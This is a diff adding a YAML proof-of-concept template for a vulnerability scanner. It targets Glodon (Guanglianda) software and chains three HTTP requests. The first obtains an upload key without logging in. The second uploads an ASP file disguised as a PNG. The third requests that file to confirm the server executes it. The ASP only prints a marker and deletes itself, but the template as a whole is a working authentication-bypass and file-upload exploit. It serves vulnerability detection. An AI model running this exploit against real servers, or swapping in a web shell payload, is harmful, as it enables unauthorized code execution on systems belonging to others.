@@ -1,0 +1,44 @@
+name: poc-yaml-guanglianda-bypasslogin-fileupload
+manual: true
+transport: http
+set:
+    s1: randomLowercase(8)
+    s2: randomLowercase(8)
+    rboundary: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /Services/FileService/UserFiles/GetAuthorizeKey.ashx
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: destDir=./sysinfo/&destFilename={{s1}}.asp
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("fileExists:")
+        output:
+            search: |
+                "key:\"(?P<serial>.+?)\"}".bsubmatch(response.body)
+            key: search["serial"]
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /Services/FileService/UserFiles/UserFilesUpload.ashx
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"destDir\"\r\n\r\n./sysinfo/\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"destFilename\"\r\n\r\n{{s1}}.asp\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"key\"\r\n\r\n{{key}}\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"successUrl\"\r\n\r\n~\\sysinfo\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"overWrite\"\r\n\r\ntrue\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"FileData\"; filename=\"{{s1}}.asp\"\r\nContent-Type: image/png\r\n\r\n<% response.write(\"{{s2}}\")\r\nset myfso=server.CreateObject(\"scripting.filesystemobject\")\r\nmyfso.DeleteFile(server.MapPath(request.ServerVariables(\"Path_Info\")))\r\n%>12\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+            follow_redirects: false
+        expression: response.status == 302 && response.body_string.contains("success")
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /UserFiles/sysinfo/{{s1}}.asp
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(s2)
+expression: r0() && r1() && r2()
+detail:
+    author: 2husky
+    links:
+        - https://zsxq.com/
